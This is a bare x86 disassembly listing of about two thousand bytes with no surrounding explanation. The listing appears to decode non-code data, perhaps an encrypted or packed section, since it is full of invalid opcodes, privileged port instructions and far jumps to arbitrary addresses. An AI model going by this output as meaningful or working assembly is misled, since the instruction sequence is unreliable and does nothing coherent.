  4071ea:	cmp    DWORD PTR [edi],edx
  4071ec:	mov    ds:0x153b8b67,eax
  4071f1:	jp     0x407233
  4071f3:	sub    BYTE PTR [esi-0x65],0x28
  4071f7:	sbb    eax,0xc430d36d
  4071fc:	fwait
  4071fd:	ror    DWORD PTR [di],0xc9
  407201:	mov    es:0x837d35d0,al
  407207:	retf   
  407208:	push   esp
  407209:	adc    BYTE PTR [edi+eiz*2],dh
  40720c:	std    
  40720d:	fadd   QWORD PTR fs:[ebp+ebp*2-0x80]
  407212:	lock jl 0x407215
  407215:	or     eax,0x39e61a4f
  40721a:	stos   DWORD PTR es:[edi],eax
  40721b:	or     edx,ebp
  40721d:	clc    
  40721e:	pop    ebx
  40721f:	test   eax,0xca958c4a
  407224:	pop    ss
  407225:	or     DWORD PTR [eax+edi*4-0x4247844c],edx
  40722c:	cdq    
  40722d:	fadd   st(2),st
  40722f:	ja     0x40728e
  407231:	cli    
  407232:	cli    
  407233:	cld    
  407234:	ret    
  407235:	xor    edx,DWORD PTR [ebx+0x1851e6bd]
  40723b:	adc    eax,0x24322a16
  407240:	mov    ebp,0x3512c688
  407245:	call   0x1542:0x5b67f29b
  40724c:	outs   dx,BYTE PTR ds:[esi]
  40724d:	and    al,0x16
  40724f:	cmp    ah,BYTE PTR [eax-0x16a0fceb]
  407255:	mov    ebp,0xda892d23
  40725a:	das    
  40725b:	push   edx
  40725c:	push   0xffffffee
  40725e:	or     BYTE PTR ds:0x8e7eeb6d,al
  407264:	lods   eax,DWORD PTR ds:[esi]
  407265:	pop    ebp
  407266:	add    al,0xcc
  407268:	adc    eax,0xc50e94aa
  40726d:	add    cl,BYTE PTR [edx-0x7aff1c0b]
  407273:	pushf  
  407274:	clc    
  407275:	and    eax,0x98fad953
  40727a:	les    edi,FWORD PTR [edx-0x532e9b2e]
  407280:	jl     0x4072e8
  407282:	cmp    esi,DWORD PTR [ecx+eiz*2+0x78]
  407286:	push   esp
  407287:	iret   
  407288:	mov    cl,0x6a
  40728a:	jno    0x407239
  40728c:	in     al,0xa9
  40728e:	adc    esp,edx
  407290:	std    
  407291:	sbb    BYTE PTR [edx+0x11350848],cl
  407297:	fidiv  DWORD PTR [ebx-0x5d]
  40729a:	fs cmc 
  40729c:	out    dx,al
  40729d:	stos   BYTE PTR es:[edi],al
  40729e:	pop    edi
  40729f:	push   cs
  4072a0:	(bad)  
  4072a2:	sbb    eax,0x9df7ae8
  4072a7:	(bad)  
  4072a8:	jne    0x4072b2
  4072aa:	fistp  DWORD PTR [esi]
  4072ac:	xchg   edi,eax
  4072ad:	push   edx
  4072ae:	sub    eax,0x4dcef6a4
  4072b3:	adc    DWORD PTR [ebx+esi*4+0x6a6be17a],0xaa42d5a9
  4072be:	cdq    
  4072bf:	ins    BYTE PTR es:[edi],dx
  4072c0:	push   ss
  4072c1:	enter  0x181c,0x54
  4072c5:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4072c6:	mov    WORD PTR [eax-0x693c955b],cs
  4072cc:	push   edi
  4072cd:	sar    BYTE PTR [ebp-0x29],1
  4072d0:	adc    esp,DWORD PTR [edx+esi*2+0x32]
  4072d4:	pop    ebx
  4072d5:	add    al,0xc8
  4072d7:	mov    esi,0x6185ea13
  4072dc:	cld    
  4072dd:	push   esi
  4072de:	or     dl,BYTE PTR [ecx-0x24]
  4072e1:	loope  0x4072c4
  4072e3:	mov    ds:0xcd469123,al
  4072e8:	pop    eax
  4072e9:	shl    BYTE PTR ds:0x3d3a87eb,cl
  4072ef:	aas    
  4072f0:	out    dx,eax
  4072f1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4072f2:	add    BYTE PTR [eax-0xa540afc],bh
  4072f8:	mov    BYTE PTR ds:0xc17b287e,dl
  4072fe:	stos   BYTE PTR es:[edi],al
  4072ff:	adc    DWORD PTR [ecx+0x15],0x70
  407303:	(bad)  
  407304:	ins    DWORD PTR es:[edi],dx
  407305:	enter  0xbef8,0xf1
  407309:	shl    BYTE PTR [ebp-0x2af45f05],cl
  40730f:	xor    cl,al
  407311:	adc    eax,0xb1b686fb
  407316:	into   
  407317:	push   edx
  407318:	pop    esp
  407319:	call   0xcc2d4cb0
  40731e:	outs   dx,BYTE PTR ds:[esi]
  40731f:	ret    
  407320:	pop    edx
  407321:	das    
  407322:	lods   eax,DWORD PTR ds:[si]
  407324:	cmp    DWORD PTR ds:0xee09bd61,esp
  40732a:	ja     0x40735a
  40732c:	xchg   edi,eax
  40732d:	jbe    0x40739c
  40732f:	mov    DWORD PTR [eax],esp
  407331:	aas    
  407332:	jne    0x407360
  407334:	imul   esi,DWORD PTR [edx],0x597be858
  40733a:	mov    edi,0x87c6c41c
  40733f:	push   eax
  407340:	pop    es
  407341:	or     BYTE PTR [eax-0x2e],ch
  407344:	adc    DWORD PTR [ecx],edx
  407346:	dec    ebx
  407347:	mov    DWORD PTR [esp+ecx*2+0x3],ecx
  40734b:	jl     0x4073ac
  40734d:	imul   ecx,DWORD PTR [edx+0x25],0x68
  407351:	pcmpgtd mm5,mm0
  407354:	sbb    dh,BYTE PTR [esi]
  407356:	(bad)  
  407357:	in     eax,dx
  407358:	repnz xchg esi,eax
  40735a:	popa   
  40735b:	test   DWORD PTR [esi-0x6b],edi
  40735e:	mov    DWORD PTR [ebx],ecx
  407360:	jmp    0xa8ae3c29
  407365:	mov    ds:0x66574065,eax
  40736a:	ins    DWORD PTR es:[edi],dx
  40736b:	jns    0x40730c
  40736d:	or     BYTE PTR [ecx],dh
  40736f:	(bad)  
  407371:	outs   dx,BYTE PTR ds:[esi]
  407372:	jp     0x407372
  407374:	test   BYTE PTR [esi+0x1a59d2aa],ch
  40737a:	call   FWORD PTR [edx+0x5f]
  40737d:	xchg   esp,eax
  40737e:	shl    BYTE PTR [esi-0x624326ca],1
  407384:	sub    eax,0x6f671579
  407389:	imul   esp,DWORD PTR [esi+ecx*8+0x1c],0xf5648ff2
  407391:	inc    ebp
  407392:	into   
  407393:	stos   BYTE PTR es:[edi],al
  407394:	mov    bh,0x54
  407396:	sbb    eax,0xe8d30a4f
  40739b:	ss (bad) 
  40739d:	adc    DWORD PTR [ebp-0x3e74eb52],edi
  4073a3:	int    0x8b
  4073a5:	fidivr WORD PTR [eax+edx*1+0x23]
  4073a9:	jl     0x40741e
  4073ab:	mov    edi,ss
  4073ad:	lahf   
  4073ae:	mul    bh
  4073b0:	mov    edi,0x188f5c54
  4073b5:	push   ebx
  4073b6:	fldcw  WORD PTR [ecx+0x134e5e32]
  4073bc:	dec    ecx
  4073bd:	and    ah,BYTE PTR [edi-0x59]
  4073c0:	sbb    dh,ch
  4073c2:	call   0x1e81:0x363c236e
  4073c9:	sub    BYTE PTR [edi],al
  4073cb:	push   es
  4073cc:	ret    0xd8b2
  4073cf:	(bad)
  4073d3:	(bad)  
  4073d4:	jp     0x4073a2
  4073d6:	sbb    edi,esi
  4073d8:	(bad)  
  4073d9:	inc    esi
  4073da:	iret   
  4073db:	inc    eax
  4073dc:	loopne 0x407388
  4073de:	jo     0x407429
  4073e0:	push   0x3c
  4073e2:	out    0xf7,al
  4073e4:	adc    ah,ch
  4073e6:	pusha  
  4073e7:	cmp    eax,DWORD PTR [ebp*4+0x63123349]
  4073ee:	xor    esp,DWORD PTR [eax]
  4073f0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4073f1:	arpl   cx,si
  4073f3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4073f4:	stos   DWORD PTR es:[edi],eax
  4073f5:	add    DWORD PTR [eax],0xd26e386a
  4073fb:	mov    al,0x57
  4073fd:	push   ecx
  4073fe:	inc    edx
  4073ff:	mov    ecx,0xe6013a6a
  407404:	mov    cl,0xf4
  407406:	and    eax,0xd95e6916
  40740b:	push   0x635ba4ce
  407410:	xchg   edi,eax
  407411:	adc    BYTE PTR [edi+edi*8-0xe4dc748],dh
  407418:	sbb    eax,0x9551578
  40741d:	xchg   ebx,eax
  40741e:	enter  0x283d,0x56
  407422:	xor    DWORD PTR [ebp+0x7b2e3083],ecx
  407428:	je     0x4073ab
  40742a:	sbb    ebx,DWORD PTR [ebx-0x10]
  40742d:	rol    dl,0xec
  407430:	out    0x28,eax
  407432:	int    0xfc
  407434:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  407435:	enter  0xd068,0x4d
  407439:	dec    esi
  40743a:	jae    0x407487
  40743c:	rcr    BYTE PTR [eax+edi*4-0x20],0x72
  407441:	dec    ebp
  407442:	cs jl  0x4074af
  407445:	test   BYTE PTR [eax-0x5221b5fc],al
  40744b:	mov    bl,0x71
  40744d:	sbb    eax,0xc204df09
  407452:	mov    al,0x39
  407454:	adc    ch,BYTE PTR [esi+0x221dd51d]
  40745a:	pop    ebx
  40745b:	adc    BYTE PTR [eax+ebp*1+0x14],dh
  40745f:	dec    edx
  407460:	mov    ecx,0x57025d4
  407465:	or     BYTE PTR [ebx],cl
  407467:	add    ch,BYTE PTR [ebx-0x13af36b3]
  40746d:	inc    eax
  40746e:	dec    ebp
  40746f:	stc    
  407470:	and    ch,bh
  407472:	jae    0x4074c0
  407474:	cmp    eax,ebp
  407476:	call   0x83a2:0xd4010f4f
  40747d:	(bad)  
  40747e:	cwde   
  40747f:	fistp  QWORD PTR [eax]
  407481:	inc    esi
  407482:	inc    eax
  407483:	pusha  
  407484:	dec    eax
  407485:	ss mov edx,0x66952e68
  40748b:	call   0xc5fe1bf7
  407490:	jno    0x407490
  407492:	jo     0x4074e0
  407494:	ins    DWORD PTR es:[edi],dx
  407495:	xchg   edx,eax
  407496:	scas   eax,DWORD PTR es:[edi]
  407497:	sbb    eax,0x57944cce
  40749c:	addr16 pop edx
  40749e:	mov    ebx,0xada3baa5
  4074a3:	push   cs
  4074a4:	sub    esi,DWORD PTR [esi-0x76]
  4074a7:	jmp    0x407491
  4074a9:	and    dl,BYTE PTR [esi+0x49]
  4074ac:	clc    
  4074ad:	jno    0x4074b2
  4074af:	dec    DWORD PTR [edi-0x2c19a563]
  4074b5:	cli    
  4074b6:	mov    WORD PTR [esi],gs
  4074b8:	popa   
  4074b9:	lahf   
  4074ba:	pop    es
  4074bb:	repnz lea esi,[eax+0x22]
  4074bf:	pop    esp
  4074c0:	jno    0x4074ce
  4074c2:	push   esi
  4074c3:	mov    edx,0x1f99db3f
  4074c8:	sbb    edi,DWORD PTR [ecx]
  4074ca:	outs   dx,DWORD PTR ds:[esi]
  4074cb:	xchg   edx,eax
  4074cc:	dec    ecx
  4074cd:	fidivr DWORD PTR [eax+0x40]
  4074d0:	gs popf 
  4074d2:	xor    eax,0x7b7abc2b
  4074d7:	mov    al,0x92
  4074d9:	mov    eax,ds:0xa3a4a958
  4074de:	clc    
  4074df:	xchg   esp,eax
  4074e0:	jb     0x40748d
  4074e2:	pop    es
  4074e3:	jmp    0x407528
  4074e5:	sbb    al,0x5
  4074e7:	in     eax,0xcb
  4074e9:	xor    al,0x63
  4074eb:	out    dx,al
  4074ec:	sahf   
  4074ed:	pop    esp
  4074ee:	sub    dh,BYTE PTR [ebx]
  4074f0:	lods   eax,DWORD PTR ds:[esi]
  4074f1:	dec    ebx
  4074f2:	adc    ebp,esp
  4074f4:	mov    cl,dl
  4074f6:	ror    cl,0xd0
  4074f9:	xchg   ecx,eax
  4074fa:	enter  0x438b,0xe3
  4074fe:	in     eax,0xce
  407500:	mov    ecx,0xc5cc975c
  407505:	mov    edi,0xfef76094
  40750a:	stos   BYTE PTR es:[edi],al
  40750b:	add    BYTE PTR [ecx+0xe],bh
  40750e:	rcr    ch,0x6e
  407511:	test   DWORD PTR [esp+esi*1+0x45751902],ebx
  407518:	mov    bl,0xe8
  40751a:	mov    eax,0x35deb763
  40751f:	or     BYTE PTR [eax-0x1e],0x4e
  407523:	adc    BYTE PTR [ebx-0x64],ah
  407526:	into   
  407527:	jg     0x407573
  407529:	shl    cl,1
  40752b:	jmp    DWORD PTR [ebp+0x4a0a423b]
  407531:	pop    ss
  407532:	dec    ebp
  407533:	mov    eax,ds:0x834fea00
  407538:	cmp    al,BYTE PTR [eax]
  40753a:	les    ecx,FWORD PTR [edx+0x5ce298c5]
  407540:	addr16 mov es,ebx
  407543:	in     al,0x6e
  407545:	je     0x40753f
  407547:	jns    0x4074f5
  407549:	inc    esp
  40754a:	jecxz  0x407524
  40754c:	(bad)  
  40754d:	ins    BYTE PTR es:[edi],dx
  40754e:	sbb    DWORD PTR [ebx-0x1a800f2a],ecx
  407554:	sub    eax,DWORD PTR cs:[edi-0x3c]
  407558:	cdq    
  407559:	outs   dx,DWORD PTR ds:[esi]
  40755a:	and    al,0x51
  40755c:	jne    0x407580
  40755e:	cwde   
  40755f:	in     eax,dx
  407560:	fst    DWORD PTR [edx-0x35]
  407563:	retf   0x7e42
  407566:	dec    esi
  407567:	cmp    eax,0xddd61e5a
  40756c:	lods   eax,DWORD PTR ds:[esi]
  40756d:	sar    BYTE PTR [ebx+0x4a],0xa5
  407571:	mov    bl,0x97
  407573:	add    eax,0xca2b0f83
  407578:	mov    ebp,0x444b7a79
  40757d:	call   0xe7881bac
  407582:	mov    ecx,DWORD PTR [esi-0x51]
  407585:	and    al,ah
  407587:	mov    bh,0x48
  407589:	jmp    0x6e7905a0
  40758e:	push   eax
  40758f:	fld    QWORD PTR [esi+0x43e0f2cb]
  407595:	clc    
  407596:	xchg   DWORD PTR [edi+0x501fb8e0],ecx
  40759c:	jbe    0x407550
  40759e:	xchg   DWORD PTR [eax],ebx
  4075a0:	dec    ebx
  4075a1:	fidivr DWORD PTR [ecx]
  4075a3:	mov    bh,0x18
  4075a5:	mov    eax,0x4abd0a8d
  4075aa:	push   ebp
  4075ab:	or     bh,bh
  4075ad:	add    DWORD PTR [ebx+0x5f6e2d01],0x9a24341e
  4075b7:	and    BYTE PTR [edx+0x6d75a021],al
  4075bd:	mul    BYTE PTR [edx-0x1b]
  4075c0:	out    dx,eax
  4075c1:	cmp    DWORD PTR [esi-0x5db20a9b],edi
  4075c7:	fist   WORD PTR [eax+0x2fef07ef]
  4075cd:	xor    edi,DWORD PTR ds:0x3c805944
  4075d3:	dec    edx
  4075d4:	in     eax,0xd2
  4075d6:	lea    esi,[eax-0x5f]
  4075d9:	xor    edi,DWORD PTR [ebx+ebx*2-0x79]
  4075dd:	push   ebp
  4075de:	les    eax,FWORD PTR [ebx-0x3a01e5f3]
  4075e4:	test   BYTE PTR [esi+0x52671f8c],cl
  4075ea:	inc    edi
  4075eb:	xor    DWORD PTR [esi-0x59],eax
  4075ee:	mov    esi,0xce308fb0
  4075f3:	test   eax,0xffbed4b0
  4075f8:	dec    esi
  4075f9:	dec    ebx
  4075fa:	add    ecx,DWORD PTR [eax]
  4075fc:	fmul   QWORD PTR [ecx]
  4075fe:	sbb    eax,0x8d2fbd3e
  407603:	not    DWORD PTR [eax]
  407605:	(bad)  
  407606:	and    DWORD PTR [ebx+0x20],edi
  407609:	pop    eax
  40760a:	or     DWORD PTR [eax+0x6a4f6c8c],0x27
  407611:	jne    0x407678
  407613:	fisub  DWORD PTR [ebx]
  407615:	sbb    BYTE PTR [esi+ecx*1-0x41],ah
  407619:	cmp    DWORD PTR [edi+0x40],ebp
  40761c:	ss loop 0x4075f1
  40761f:	mov    es,ecx
  407621:	cmp    eax,0xd3d652ea
  407626:	sub    DWORD PTR [ecx+0x73],edx
  407629:	enter  0x9aa5,0xdc
  40762d:	(bad)  
  40762e:	int    0x3a
  407630:	retf   
  407631:	inc    eax
  407632:	in     eax,dx
  407633:	pop    ebx
  407634:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  407635:	jb     0x407600
  407637:	sbb    edi,edx
  407639:	stos   DWORD PTR es:[edi],eax
  40763a:	add    DWORD PTR [edx],ebx
  40763c:	lahf   
  40763d:	mov    DWORD PTR [ecx],ebx
  40763f:	inc    edx
  407640:	es pop ds
  407642:	loopne 0x407620
  407644:	push   esi
  407645:	xchg   ecx,ebx
  407647:	or     eax,0xeb4e3097
  40764c:	(bad)  
  40764d:	or     ecx,eax
  40764f:	pop    ds
  407650:	mov    BYTE PTR [eax-0x50],bl
  407653:	sub    al,0xdc
  407655:	cmc    
  407656:	cmp    cl,BYTE PTR [ecx]
  407658:	daa    
  407659:	sub    DWORD PTR [eax+0xd],edx
  40765c:	jmp    0x407643
  40765e:	idiv   DWORD PTR [esi]
  407660:	xchg   BYTE PTR [edi],dl
  407662:	cmp    eax,0x1cacf8ac
  407667:	dec    edi
  407668:	mov    edx,0x8f349483
  40766d:	sbb    DWORD PTR [ebx-0x57518fb3],ebp
  407673:	xor    esp,DWORD PTR [eax]
  407675:	adc    cl,BYTE PTR [ebx+0x534fdfed]
  40767b:	pop    ecx
  40767c:	sub    DWORD PTR [ebp-0x7631f465],edx
  407682:	and    bl,dl
  407684:	dec    eax
  407685:	retf   0x4a43
  407688:	retf   0x14f8
  40768b:	test   edi,esi
  40768d:	in     eax,dx
  40768e:	pusha  
  40768f:	fisub  WORD PTR [esi+0x26]
  407692:	adc    BYTE PTR [ebx+eiz*8-0x3d],cl
  407696:	cmp    ecx,DWORD PTR [ebp-0x17]
  407699:	inc    ecx
  40769a:	add    bl,BYTE PTR ds:0x1ee85ced
  4076a0:	out    dx,al
  4076a1:	sar    DWORD PTR [ecx-0x786fc63],0x8d
  4076a8:	xchg   si,ax
  4076aa:	test   BYTE PTR [ebp-0x2ae14f5c],0xed
  4076b1:	mov    bl,BYTE PTR gs:0xe1117e2b
  4076b8:	cmp    cl,cl
  4076ba:	and    edx,ebp
  4076bc:	sbb    DWORD PTR [esi],edx
  4076be:	adc    al,0xbc
  4076c0:	ret    0x941
  4076c3:	scas   eax,DWORD PTR es:[edi]
  4076c4:	and    BYTE PTR ds:0xc37b8135,cl
  4076ca:	ins    DWORD PTR es:[edi],dx
  4076cb:	icebp  
  4076cc:	scas   eax,DWORD PTR es:[edi]
  4076cd:	pop    edi
  4076ce:	aas    
  4076cf:	mov    BYTE PTR [ecx],bh
  4076d1:	push   0xe4e0c86e
  4076d6:	shl    DWORD PTR [esi+0x2],0x7f
  4076da:	mov    eax,0x9c2c02f1
  4076df:	or     DWORD PTR [ecx],esi
  4076e1:	shl    BYTE PTR [esi],0x23
  4076e4:	jmp    0x4076bb
  4076e6:	inc    esp
  4076e7:	popf   
  4076e8:	repz clc 
  4076ea:	dec    eax
  4076eb:	(bad)  
  4076ec:	fist   DWORD PTR [ebp+0x37950df]
  4076f2:	inc    eax
  4076f3:	mov    BYTE PTR [eax+ecx*8-0x5f2ebe16],bh
  4076fa:	mov    esi,0x664da535
  4076ff:	outs   dx,BYTE PTR ds:[esi]
  407700:	pop    eax
  407701:	lock fwait
  407703:	cmp    eax,0x13298882
  407708:	rcl    edx,1
  40770a:	lods   al,BYTE PTR ds:[esi]
  40770b:	xor    al,0xe7
  40770d:	or     edi,DWORD PTR [ebp+0x6f]
  407710:	neg    DWORD PTR ds:0x755659
  407716:	lods   eax,DWORD PTR ds:[esi]
  407717:	add    eax,DWORD PTR [ebp+0x2e52db14]
  40771d:	lahf   
  40771e:	push   edi
  40771f:	or     al,0xc
  407721:	stc    
  407722:	pop    esi
  407723:	jmp    DWORD PTR [edi-0x59597d2]
  407729:	pop    ebp
  40772a:	and    bl,BYTE PTR [edi]
  40772c:	ins    DWORD PTR es:[edi],dx
  40772d:	outs   dx,DWORD PTR ds:[esi]
  40772e:	adc    BYTE PTR [edx+0x41],ah
  407731:	fsub   QWORD PTR [ecx-0xd]
  407734:	and    eax,0x9845db44
  407739:	mov    edx,0x91eef5ef
  40773e:	arpl   WORD PTR [edi+0x1b],cx
  407741:	xor    cl,ah
  407743:	add    BYTE PTR [ebx-0x7a],ch
  407746:	retf   
  407747:	in     eax,dx
  407748:	mov    edi,0xc97bd68a
  40774d:	(bad)
  407750:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  407751:	push   cs
  407752:	(bad)  
  407753:	adc    ebx,esi
  407755:	mov    dl,0x55
  407757:	jg     0x40778e
  407759:	sub    ebp,DWORD PTR [ebx-0x55]
  40775c:	mov    ebx,0x69a83e83
  407761:	js     0x4077a9
  407763:	push   edi
  407764:	icebp  
  407765:	mov    DWORD PTR ds:0x52751bcd,edi
  40776b:	push   0x7371eb1d
  407770:	sbb    ebx,esi
  407772:	push   cs
  407773:	mov    DWORD PTR [esi-0x214c48e],eax
  407779:	pusha  
  40777a:	popa   
  40777b:	retw   
  40777d:	cmp    al,0xa7
  40777f:	dec    ecx
  407780:	and    BYTE PTR [esi],dh
  407782:	xor    BYTE PTR [ecx+esi*2],bh
  407785:	sahf   
  407786:	call   0xc7fcaec1
  40778b:	in     al,0x24
  40778d:	dec    edi
  40778e:	cmp    BYTE PTR [ecx+0x68],al
  407791:	imul   ebx,ebx,0xffffffda
  407794:	ret    
  407795:	rol    DWORD PTR [ebx],1
  407797:	test   eax,0x3781001a
  40779c:	adc    eax,0x6bcddfdb
  4077a1:	xchg   esp,eax
  4077a2:	add    eax,0xc2a255d2
  4077a7:	mov    bl,0x12
  4077a9:	jp     0x4077cf
  4077ab:	xor    dh,BYTE PTR [esi]
  4077ad:	ret    0xd634
  4077b0:	in     eax,dx
  4077b1:	jno    0x40776e
  4077b3:	xlat   BYTE PTR ds:[ebx]
  4077b4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4077b5:	push   esi
  4077b6:	xor    eax,0x74e3463a
  4077bb:	mov    ds:0x49a80e60,eax
  4077c0:	sub    BYTE PTR [esi],dl
  4077c2:	inc    edi
  4077c3:	outs   dx,DWORD PTR ds:[esi]
  4077c4:	xor    DWORD PTR ds:0xa91f8449,ebp
  4077ca:	(bad)  
  4077cb:	rcr    eax,cl
  4077cd:	push   esp
  4077ce:	call   FWORD PTR [esi+0x4e360fb1]
  4077d4:	mov    bh,0xe2
  4077d6:	(bad)  
  4077d7:	data16 loop 0x407825
  4077da:	(bad)  
  4077db:	jp     0x407762
  4077dd:	mov    ch,0x85
  4077df:	ins    DWORD PTR es:[edi],dx
  4077e0:	jle    0x407853
  4077e2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4077e3:	dec    eax
  4077e4:	fisttp WORD PTR [ebx]
  4077e6:	mul    BYTE PTR [edx]
  4077e8:	popa   
  4077e9:	ficom  DWORD PTR [ecx-0x2a]
  4077ec:	dec    ebx
  4077ed:	adc    ebp,ebp
  4077ef:	cmp    eax,0xfadfc605
  4077f4:	(bad)  
  4077f5:	in     eax,dx
  4077f6:	push   es
  4077f7:	sub    BYTE PTR [ebx-0x65],bl
  4077fa:	pop    ecx
  4077fb:	cs jecxz 0x407791
  4077fe:	add    esp,esp
  407800:	jp     0x407783
  407802:	out    0x17,eax
  407804:	push   es
  407805:	sbb    eax,0x6ebdb74e
  40780a:	mov    dh,0xbd
  40780c:	sahf   
  40780d:	mov    al,0xcd
  40780f:	mov    eax,ds:0x2e74441
  407814:	stc    
  407815:	(bad)  
  407816:	mul    BYTE PTR [ecx+0x79]
  407819:	push   es
  40781a:	loopne 0x40785b
  40781c:	xor    esi,0x5651954
  407822:	(bad)  
  407823:	sbb    al,0x7e
  407825:	dec    edx
  407826:	jp     0x407862
  407828:	xchg   esp,eax
  407829:	mov    eax,0xfb4abfe1
  40782e:	push   edi
  40782f:	gs popf 
  407831:	jmp    0xb162:0x46740c49
  407838:	aam    0x4c
  40783a:	lahf   
  40783b:	sar    BYTE PTR [esi+0xd],0xc9
  40783f:	je     0x40789a
  407841:	and    eax,0x67c6cc16
  407846:	dec    esp
  407847:	and    BYTE PTR [ebp+0x3a0ff20f],bh
  40784d:	syscall 
  40784f:	jp     0x4077e4
  407851:	or     al,0xf4
  407853:	imul   ecx,DWORD PTR ds:0x8c8ac03d,0xffffffe0
  40785a:	push   ebp
  40785b:	mov    edi,0x71614550
  407860:	inc    ebx
  407861:	pusha  
  407862:	idiv   DWORD PTR [edx+eiz*4+0x2b]
  407866:	jmp    0x407825
  407868:	push   ds
  407869:	lea    ebx,[edx+0x1d]
  40786c:	jae    0x407812
  40786e:	sub    BYTE PTR [esi+0x77],0x11
  407872:	pop    edx
  407873:	pop    esi
  407874:	out    0x4a,eax
  407876:	test   eax,0x5246d79a
  40787b:	mov    al,ds:0x30e73180
  407880:	xor    ch,BYTE PTR [eax]
  407882:	mov    edi,0x32692ae1
  407887:	lds    edx,FWORD PTR [eax]
  407889:	aas    
  40788a:	push   esi
  40788b:	arpl   dx,di
  40788d:	(bad)  
  40788f:	add    BYTE PTR [edx+0x692bd405],ah
  407895:	fild   WORD PTR [esi+0x6b2645dc]
  40789b:	aas    
  40789c:	aaa    
  40789d:	mov    DWORD PTR [esi+0x296401dc],edx
  4078a3:	jne    0x40782c
  4078a5:	outs   dx,BYTE PTR ds:[esi]
  4078a6:	mov    ch,0x68
  4078a8:	cwde   
  4078a9:	ins    DWORD PTR es:[edi],dx
  4078aa:	sahf   
  4078ab:	test   BYTE PTR [edx],ah
  4078ad:	xlat   BYTE PTR ds:[ebx]
  4078ae:	ss retf 
  4078b0:	push   DWORD PTR [edx]
  4078b2:	adc    eax,0x955f22b2
  4078b7:	jp     0x40791c
  4078b9:	xchg   ebp,eax
  4078ba:	lahf   
  4078bb:	mov    WORD PTR [edi],?
  4078bd:	jbe    0x4078c8
  4078bf:	cmp    al,0xf3
  4078c1:	pop    ds
  4078c2:	xchg   BYTE PTR [ebx-0x58],cl
  4078c5:	mov    dl,0x58
  4078c7:	aas    
  4078c8:	pushf  
  4078c9:	daa    
  4078ca:	scas   al,BYTE PTR es:[edi]
  4078cb:	mov    dl,0x26
  4078cd:	sub    eax,0xb4bb3fa6
  4078d2:	mov    ds:0xabde8c2c,eax
  4078d7:	add    al,0x43
  4078d9:	inc    ebp
  4078da:	mov    ebp,DWORD PTR [edx+0x60ffee98]
  4078e0:	fsub   DWORD PTR [edx-0x1166b4d6]
  4078e6:	les    edi,FWORD PTR [eax]
  4078e8:	pop    ecx
  4078e9:	pop    es
  4078ea:	dec    DWORD PTR [eax]
  4078ec:	in     eax,0xb4
  4078ee:	ins    DWORD PTR es:[edi],dx
  4078ef:	or     ebp,DWORD PTR [edx]
  4078f1:	(bad)  
  4078f2:	jle    0x407916
  4078f4:	fcomp  QWORD PTR [edi]
  4078f6:	aam    0x65
  4078f8:	xchg   esp,eax
  4078f9:	adc    ebp,ecx
  4078fb:	xor    BYTE PTR [ecx-0x31],dh
  4078fe:	sbb    eax,0x9195d973
  407903:	call   0x3d57442d
  407908:	(bad)  
  40790a:	adc    esp,DWORD PTR [ebx+ebp*1]
  40790d:	xchg   edx,eax
  40790e:	lahf   
  40790f:	add    DWORD PTR [edx-0x57],0x142e71f
  407916:	test   BYTE PTR [ecx-0x43706d8],cl
  40791c:	aam    0xaf
  40791e:	les    esp,FWORD PTR [edx+eax*1-0x65]
  407922:	int    0x43
  407924:	jne    0x4078e9
  407926:	sub    edx,DWORD PTR [eax+0x58]
  407929:	lods   al,BYTE PTR ds:[esi]
  40792a:	out    dx,al
  40792b:	dec    eax
  40792c:	jle    0x407983
  40792e:	(bad)  
  40792f:	xchg   edi,eax
  407930:	je     0x4078fc
  407932:	(bad)  
  407933:	je     0x4078c8
  407935:	pop    ds
  407936:	int    0x4d
  407938:	sub    ch,BYTE PTR [eax-0x4b]
  40793b:	sahf   
  40793c:	dec    ecx
  40793d:	push   edx
  40793e:	mov    ah,BYTE PTR ds:0x1e503fa3
  407944:	aad    0x1b
  407946:	rol    BYTE PTR [eax-0x73],1
  407949:	iret   
  40794a:	daa    
  40794b:	pop    ds
  40794c:	fwait
  40794d:	sbb    ebx,edx
  40794f:	xchg   esi,eax
  407950:	add    bh,BYTE PTR [ebp-0x10dec109]
  407956:	mov    ds:0x3d016129,eax
  40795b:	bnd jge 0x4078f4
  40795e:	or     BYTE PTR [eax],ch
  407960:	xor    bh,BYTE PTR [eax]
  407962:	jo     0x407941
  407964:	aas    
  407965:	cwde   
  407966:	mov    esi,0xeb1df82d
  40796b:	push   0x616a4c04
  407970:	popf   
  407971:	push   ebx
  407972:	adc    ecx,DWORD PTR [eax]
  407974:	sub    eax,DWORD PTR ds:0x173a6407
  40797a:	cmc    
  40797b:	sbb    eax,0xea9d3a18
  407980:	sub    eax,0xe7a3f156
  407985:	xor    cl,dl
  407987:	mov    edi,0xc27e3e38
  40798c:	popa   
  40798d:	sahf   
  40798e:	push   esp
  40798f:	dec    ebx
  407990:	or     eax,0xbf79256f
  407995:	inc    esi
  407996:	cld    
  407997:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  407998:	test   al,0x13
  40799a:	dec    esi
  40799b:	or     BYTE PTR [ecx+0x712b95a],0x1f
  4079a2:	psraw  mm5,0xe
  4079a6:	mov    ds:0x9e663dfb,al
  4079ab:	icebp  
  4079ac:	add    BYTE PTR [eax-0x6fce3f60],dl
  4079b2:	sar    DWORD PTR [eax+0x1e92311f],1
  4079b8:	sbb    bl,BYTE PTR [ecx-0x64346ec7]
  4079be:	clc    
  4079bf:	sahf   
  4079c0:	mov    al,0x12
  4079c2:	push   cs
  4079c3:	inc    eax
  4079c4:	ds ins BYTE PTR es:[edi],dx
  4079c6:	sub    DWORD PTR [ebp+0x382cbba1],ecx
  4079cc:	push   edi
  4079cd:	xor    BYTE PTR ds:0x29436768,cl
  4079d3:	outs   dx,BYTE PTR ds:[esi]
  4079d4:	aaa    
  4079d5:	mov    esi,0x29a458b9
  4079da:	mov    esi,0xc7a2256d
  4079df:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4079e0:	loopne 0x4079c3
  4079e2:	loop   0x407a2e
  4079e4:	lock dec eax
  4079e6:	adc    ah,BYTE PTR [eax]
  4079e8:	std    
